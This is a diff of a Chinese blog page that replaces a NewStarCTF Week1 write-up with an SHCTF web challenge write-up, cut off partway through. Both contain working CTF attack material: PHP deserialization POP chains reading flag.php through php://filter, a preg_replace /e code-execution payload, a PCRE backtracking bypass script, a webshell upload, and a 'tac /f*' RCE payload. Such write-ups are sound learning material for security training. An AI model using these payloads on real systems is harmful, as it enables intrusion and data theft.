@@ -4,10 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2023NewStarCTF Week1 WP, RE,Misc,Web,Cpypto等">
-    <meta name="description" content="MISCCyberChef’s Secret本题就是MISC的签到题，打开后是一串base编码，
-
-M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQT">
+    <meta name="keywords" content="SHCTF-Web-WP, RE,Misc,Web,Cpypto等">
+    <meta name="description" content="WEEK1ez_serialize源码
+&amp;lt;?php
+highlight_file(__FILE__);
+class A&amp;#123;
+ public $var_1; 
+ public function __invoke()&amp;#123;
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +23,7 @@ M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQT">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2023NewStarCTF Week1 WP | Know5</title>
+    <title>SHCTF-Web-WP | Know5</title>
     <link rel="icon" type="image/jpeg" href="/medias/th.jpg">
     
     <style>
@@ -283,12 +287,12 @@ M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQT">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2023NewStarCTF Week1 WP</h1>
+                    <h1 class="description center-align post-title">SHCTF-Web-WP</h1>
                 </div>
             </div>
         </div>
@@ -312,8 +316,8 @@ M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQT">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%9F%BA%E7%A1%80%EF%BC%8C%E6%96%B0%E6%89%8B%EF%BC%8CWEB%E5%AD%A6%E4%B9%A0%EF%BC%8CCTF/">
-                                <span class="chip bg-color">基础，新手，WEB学习，CTF</span>
+                            <a href="/tags/WEB%E3%80%81%E5%AD%A6%E4%B9%A0%E3%80%81%E6%96%B0%E6%89%8B/">
+                                <span class="chip bg-color">WEB、学习、新手</span>
                             </a>
                         
                     </div>
@@ -328,21 +332,21 @@ M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQT">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-10-08
+                    2023-11-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-11-06
+                    2023-11-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    2.8k
                 </div>
                 
 
@@ -367,144 +371,589 @@ M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQT">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>本题就是MISC的签到题，打开后是一串base编码，</p>
-<blockquote>
-<p>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA&#x3D;</p>
-</blockquote>
-<p>放入随波逐流中解密</p>
-<p>该代码经历了base32-base58-base64 然后得到正确flag</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081906714.png"></p>
-<h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>本题打开是一张二维码图片，先用CQR扫描看看里面有什么</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081916262.png"></p>
-<p>说明考点并不在这，用010打开也没有得到有效信息，那就用StegSolve打开图片，在Data Extract将RGB都调到最低，得到flag</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081921280.png"></p>
-<h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>打开后得到一个pcapng文件，里面很多http请求，将其通过WireShark导出</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081932502.png"></p>
-<p>发现可疑包</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081934421.png"></p>
-<p>追踪HTTP流发现里面有一串base代码</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081935327.png"></p>
-<p>放入随波逐流base64解密俩次得到flag</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081936508.png"></p>
-<h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>打开得到一个空白文件，通过010打开发现其是一个压缩包文件且文件头错误，将文件头修改</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081938198.png"></p>
-<p>得到的压缩包里面包含着一个压缩包，解压后发现里面的txt文件需要密码才能打开，且有一段base代码的注释，解密后得到提示</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081940657.png"></p>
-<p>说明可以通过爆破来得到txt文件里面的flag，通过Ziperello进行爆破，得到密码</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081944309.png"></p>
-<p>打开txt文件得到flag</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081945006.png"></p>
-<h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>打开后就是一面空白，且通过Ctrl+A全选发现其没有规则，不考虑考morse的可能，</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081948411.png"></p>
-<p>经过上网搜索学习，发现其考点为Whitespace语言，解密后得到flag</p>
-<p>解密网站<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a></p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081949793.png"></p>
-<h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>根据题目与所给图片提示，可知是SilentEye隐写，利用SilentEye工具Decode俩次得到flag</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081953334.png"></p>
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>打开网站提示管理员泄露俩个敏感信息</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081955208.png"></p>
-<p>通过python脚本尝试一下</p>
+                <h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+class A&#123;
+ public $var_1; 
+ public function __invoke()&#123;
+  include($this-&gt;var_1);
+ &#125;
+&#125;
+class B&#123;
+ public $q;
+ public function __wakeup()
+&#123;
+ if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;
+      echo &quot;hacker&quot;;      
+    &#125;
+&#125;
+&#125;
+class C&#123;
+ public $var;
+ public $z;
+  public function __toString()&#123;
+    return $this-&gt;z-&gt;var;
+  &#125;
+&#125;
+class D&#123;
+ public $p;
+  public function __get($key)&#123;
+    $function &#x3D; $this-&gt;p;
+    return $function();
+  &#125; 
+&#125;
+if(isset($_GET[&#39;payload&#39;]))
+&#123;
+  unserialize($_GET[&#39;payload&#39;]);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造出的poc链代码如下图</p>
+<?php
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(*__FILE__*);
+
+class A&#123;
+    public $var_1 &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
+
+    public function __invoke()&#123;    
+    include($this-&gt;var_1);
+    &#125;
+&#125;
+
+class B&#123;
+    public $q;
+    public function __wakeup()
+    &#123;
+        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;
+            echo &quot;hacker&quot;;
+        &#125;
+    &#125;
+
+&#125;
+class C&#123;
+    public $var;
+    public $z;
+    public function __toString()&#123;
+        return $this-&gt;z-&gt;var;
+    &#125;
+&#125;
+
+class D&#123;
+    public $p;
+    public function __get($key)&#123;
+        $function &#x3D; $this-&gt;p;
+        return $function();
+    &#125;
+&#125;
+$b &#x3D; new B();
+$c &#x3D; new C();
+$d &#x3D; new D();
+$a &#x3D; new A();
+$b -&gt; q &#x3D; $c;
+$c -&gt; z &#x3D; $d;
+$d -&gt; p &#x3D; $a;
+echo serialize($b);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+传参后可以得到答案
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011955588.png)
+
+### ezphp
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;code&#39;]) &amp;&amp; isset($_POST[&#39;pattern&#39;]))
+&#123;
+    $pattern&#x3D;$_POST[&#39;pattern&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\&#96;|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\&#x2F;| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%&#x2F;i&quot;,$code))
+    &#123;
+        $code&#x3D;$_GET[&#39;code&#39;];
+        preg_replace(&#39;&#x2F;(&#39; . $pattern . &#39;)&#x2F;ei&#39;,&#39;print_r(&quot;\\1&quot;)&#39;, $code);
+        echo &quot;you are smart&quot;;
+    &#125;else&#123;
+        die(&quot;try again&quot;);
+    &#125;
+&#125;else&#123;
+    die(&quot;it is begin&quot;);
+&#125;
+?&gt;
+it is begin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+第一个判断需要我们get传参'code'，post传参'pattern'。
+
+第二个判断使传参'code'中不能含有其中的指令或字符，然后在其中的 **preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code);**可以得知有漏洞可以利用，即**\e的命令执行**
+
+这里引用大佬博客，[大佬连接]([关于preg_replace \e的代码执行-CSDN博客](https://blog.csdn.net/m0_64815693/article/details/130327529?ops_request_misc=&request_id=&biz_id=102&utm_term=\e的代码执行&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-130327529.142^v96^pc_search_result_base7&spm=1018.2226.3001.4187))
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012011936.png)
+
+在本题的**preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code);**代码中，可以为**$pattern**赋值为**.***以此来匹配0个或多个字符(任意字符)，他就是匹配到了$code，然后因为他是子模式，所以\1的值就是$code，然后因为在双引号中，转义了\，\1的值$code就被当做代码执行了，所以我们只需要写一个能在print_r中执行的代码
+
+> **payload   $code={${phpinfo()}}**
+>
+> **$pattern=.***
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012023531.png)
+
+### 1zzphp
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">本题源代码
+&lt;?php 
+error_reporting(0);
+highlight_file(&#39;.&#x2F;index.txt&#39;);
+if(isset($_POST[&#39;c_ode&#39;]) &amp;&amp; isset($_GET[&#39;num&#39;]))
+&#123;
+  $code &#x3D; (String)$_POST[&#39;c_ode&#39;];
+  $num&#x3D;$_GET[&#39;num&#39;];
+  if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))
+  &#123;
+    die(&quot;no number!&quot;);
+  &#125;
+  elseif(intval($num))
+  &#123;
+   if(preg_match(&#39;&#x2F;.+?SHCTF&#x2F;is&#39;, $code))
+   &#123;
+    die(&#39;no touch!&#39;);
+   &#125;
+   if(stripos($code,&#39;2023SHCTF&#39;) &#x3D;&#x3D;&#x3D; FALSE)
+   &#123;
+    die(&#39;what do you want&#39;);
+   &#125;
+   echo $flag;
+  &#125;
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+第一个问题是需要给num传参里不能有数字，第二个问题里用到了intval函数，该函数获取$num里的整数值，如果不是则返回False，并且使用正则表达式函数 `preg_match()` 来匹配字符串 `$code` 是否包含 `SHCTF`，stripos() 函数查找字符串在另一字符串中第一次出现的位置，即查找$code中是否有2023SHCTF，
+
+第一步中我们可以通过给num传参进行数组绕过，即**url+/?num[]=1**
+
+然后后面可以通过pcre时间回溯漏洞，发送大量字符串"2023SHCTF"以达到其上限从而能绕过preg_match函数，这样同时满足俩个判断从而得到flag
+
+代码为
+
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
+url &#x3D; &quot;http:&#x2F;&#x2F;112.6.51.212:31219&#x2F;?num[]&#x3D;1&quot;
 
-if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
-    # url为被扫描地址，后不加‘&#x2F;’
-    url1 &#x3D; &#39;http:&#x2F;&#x2F;4b6a43da-9744-47e0-b78d-7c4889a38fc2.node4.buuoj.cn:81&#x2F;&#39;
+data&#x3D;&#123;
+    &#39;c_ode&#39;:&#39;very&#39;*250000+&#39;2023SHCTF&#39;
+&#125;
 
-    # 常见的网站源码备份文件名
-    list1 &#x3D; [&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;]
-    # 常见的网站源码备份文件后缀
-    list2 &#x3D; [&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]
+r&#x3D;requests.post(url,data&#x3D;data)
+print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    for i in list1:
-        for j in list2:
-            back &#x3D; str(i) + &#39;.&#39; + str(j)
-            url &#x3D; str(url1) + &#39;&#x2F;&#39; + back
-            print(back + &#39;    &#39;, end&#x3D;&#39;&#39;)
-            print(requests.get(url).status_code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012041609.png)
 
-<p>发现<a target="_blank" rel="noopener" href="http://www.zip可以访问成功,/">www.zip可以访问成功，</a></p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081956429.png"></p>
-<p>下载后得到俩个敏感信息</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081957368.png"></p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081957461.png"></p>
-<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>如题目所述，一个简单的上传题，无法直接上传php文件，所以先上传一个写有一句话木马的jpg图片类型的文件并通过BP抓包</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082001955.png"></p>
-<p>将其后缀修改为.php再发送</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082002387.png"></p>
-<p>然后通过蚁剑连接从根目录下得到flag</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082003013.png"></p>
-<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><h4 id="第一步-Get传参"><a href="#第一步-Get传参" class="headerlink" title="第一步 Get传参"></a>第一步 Get传参</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082004890.png"></p>
-<h4 id="第二步-POST传参"><a href="#第二步-POST传参" class="headerlink" title="第二步 POST传参"></a>第二步 POST传参</h4><p>secret被藏在调试器中</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082006530.png"></p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082006519.png"></p>
-<p>POST传参后进入下一步并抓包</p>
-<h4 id="第三步-修改COOKIE"><a href="#第三步-修改COOKIE" class="headerlink" title="第三步 修改COOKIE"></a>第三步 修改COOKIE</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082007404.png"></p>
-<p>此时我们的power为hacker，将其修改为ctfer即可进入下一步</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082008737.png"></p>
-<h4 id="第四步-浏览器修改"><a href="#第四步-浏览器修改" class="headerlink" title="第四步 浏览器修改"></a>第四步 浏览器修改</h4><p>即将User-Agent内容修改为NewStarCTF2023即可进入下一步</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082009487.png"></p>
-<h4 id="第五步-增加访问所需网站"><a href="#第五步-增加访问所需网站" class="headerlink" title="第五步 增加访问所需网站"></a>第五步 增加访问所需网站</h4><p>即将Referer中的内容修改为newstarctf.com即可进入下一步</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082011914.png"></p>
-<h4 id="第六步-Fake-IP"><a href="#第六步-Fake-IP" class="headerlink" title="第六步 Fake IP"></a>第六步 Fake IP</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082011184.png"></p>
-<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>看到flask我想到了ssti注入，通过ssti注入得到flag</p>
-<p>即<strong>url+?number1&#x3D;1&amp;number2&#x3D;2</strong></p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082013926.png"></p>
-<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082014538.png"></p>
-<p>很简单的MD5弱类型比较</p>
-<blockquote>
-<p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708 </p>
-</blockquote>
-<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082016322.png"></p>
-<p>第二关可以通过数组绕过，php哈希函数的特性，当处理数组类型的传参时其会返回null，则就形成了null&#x3D;null满足了强等于的条件</p>
-<blockquote>
-<p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708 </p>
-<p>POST：key3[]&#x3D;1</p>
-</blockquote>
-<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082018232.png"></p>
-<p>strcmp函数特性，当传入的参数为数组时即返回null，即传入key4为数组，则返回null，null&#x3D;0符合其条件</p>
-<blockquote>
-<p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1</p>
-<p>POST：key3[]&#x3D;1</p>
-</blockquote>
-<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082020738.png"></p>
-<p>通过is_numeric()函数使传入的key5不能为纯数字且必须大于2023，则可以通过在2024后加字母来进行绕过</p>
-<blockquote>
-<p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1&amp;key5&#x3D;2024a</p>
-<p>POST：key3[]&#x3D;1</p>
-</blockquote>
-<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082021897.png"></p>
-<p>上面的正则表达式过滤了大小写字母和数字，而extract所导致的可以使本题也可以通过数组进行绕过</p>
-<blockquote>
-<p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1&amp;key5&#x3D;2024a</p>
-<p>POST：key3[]&#x3D;1&amp;flag5[]&#x3D;1</p>
-</blockquote>
-<p>得到flag</p>
-<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082026497.png"></p>
-<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231514818.png"></p>
-<p>首先打开本题环境可以看到上述php代码</p>
-<p>需要我们先找到一个$password进行MD5加密后前六个值为“c4d038”，然后在输入一个可执行的$code能够避开所过滤的值，从而得到flag</p>
-<p>我们可以通过MD5碰撞得到为我们需要的$password，其值为 ： <strong>“114514”</strong></p>
-<p>然后会发现无论我们怎么去输入$code，只要传参为<strong>e_v.a.l</strong>都无法使其执行成功，这是，这是因为在php中，空格和点无论是get或post传参都无法正常转换</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231521007.png"></p>
-<p>所以为了防止其被过滤，我们可以通过修改_来解决，这也是利用php版本问题</p>
-<blockquote>
-<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
-</blockquote>
-<p><strong>这就说明，如果我们将’-‘修改为’[‘，则后续的俩个.不会被更改为’-‘,而[也会被正常转换为’_’</strong></p>
-<p>所以我们构造如下的$code</p>
-<blockquote>
-<p>payload: POST: password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>tac /f*</code>;</p>
-</blockquote>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231529514.png"></p>
-<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>本题打开为一登录网站，如果登录进去后就是一个类似于chatgpt的东西，考虑其应该从登录页面下手，发现其为弱密码爆破，通过BP抓包</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231535100.png"></p>
-<p>通过BP抓包发现其密码也被MD5加密过</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231537883.png"></p>
-<p>通过弱密码爆破，发现其密码为000000，这里图省事直接输入爆破了</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231538036.png"></p>
-<p>通过代理中的HTTP历史记录，可以发现一个302跳转，点击进去发现里面有着flag</p>
-<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231544781.png"></p>
-<h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2>
+## WEEK2
+
+### serialize
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">源代码
+&lt;?php
+highlight_file(__FILE__);
+class misca&#123;
+  public $gao;
+  public $fei;
+  public $a;
+  public function __get($key)&#123;
+    $this-&gt;miaomiao();
+    $this-&gt;gao&#x3D;$this-&gt;fei;
+    die($this-&gt;a);
+  &#125;
+  public function miaomiao()&#123;
+    $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;
+  &#125;
+&#125;
+class musca&#123;
+  public $ding;
+  public $dong;
+  public function __wakeup()&#123;
+    return $this-&gt;ding-&gt;dong;
+  &#125;
+&#125;
+class milaoshu&#123;
+  public $v;
+  public function __tostring()&#123;
+    echo&quot;misca~musca~milaoshu~~~&quot;;
+    include($this-&gt;v);
+  &#125;
+&#125;
+function check($data)&#123;
+  if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;
+    die(&quot;you should think harder!&quot;);
+  &#125;
+  else return $data;
+&#125;
+unserialize(check($_GET[&quot;wanna_fl.ag&quot;]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+可以构造如下图的poc链
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(*__FILE__*);
+class misca&#123;
+    public $gao;
+    public $fei;
+    public $a;
+    public function __get($key)&#123;
+        $this-&gt;miaomiao();
+        $this-&gt;gao&#x3D;$this-&gt;fei;
+        die($this-&gt;a);
+    &#125;
+    public function miaomiao()&#123;
+        $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;
+    &#125;
+&#125;
+class musca&#123;
+    public $ding;
+    public $dong;
+    public function __wakeup()&#123;
+        return $this-&gt;ding-&gt;dong;
+    &#125;
+&#125;
+class milaoshu&#123;
+    public $v &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
+    public function __tostring()&#123;
+        echo&quot;misca~musca~milaoshu~~~&quot;;
+        include($this-&gt;v);
+    &#125;
+&#125;
+function check($data)&#123;
+    if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;
+        die(&quot;you should think harder!&quot;);
+    &#125;
+    else return $data;
+&#125;
+$a &#x3D; new musca();
+$a -&gt; ding &#x3D; new misca();
+$a -&gt; ding -&gt; fei &#x3D; new milaoshu();
+$a -&gt; ding -&gt; a &#x3D; &amp;$a -&gt; ding -&gt;gao;
+$b &#x3D; serialize($a);
+echo serialize(array($a));
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+将输出的序列化值进行传参从而可以得到flag，将其base64解码即是flag
+
+![](https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012052335.png)
+
+这其中要注意的是传参的 **$wanna_fl.ag**中需要将其转换为 **wanna[fl.ag**以确保岂能在get中正确传参，当get传参出现[时，将会使其变为_，且后续.不会变化，也就是说，如果不做此修改，则会导致.无法被识别，从而无法满足传参的条件。
+
+### no_wake_up
+
+本题也是一个反序列化题，题目源码为
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+class flag&#123;
+  public $username;
+  public $code;
+  public function __wakeup()&#123;
+    $this-&gt;username &#x3D; &quot;guest&quot;;
+  &#125;
+  public function __destruct()&#123;
+    if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;
+      include($this-&gt;code);
+    &#125;
+  &#125;
+&#125;
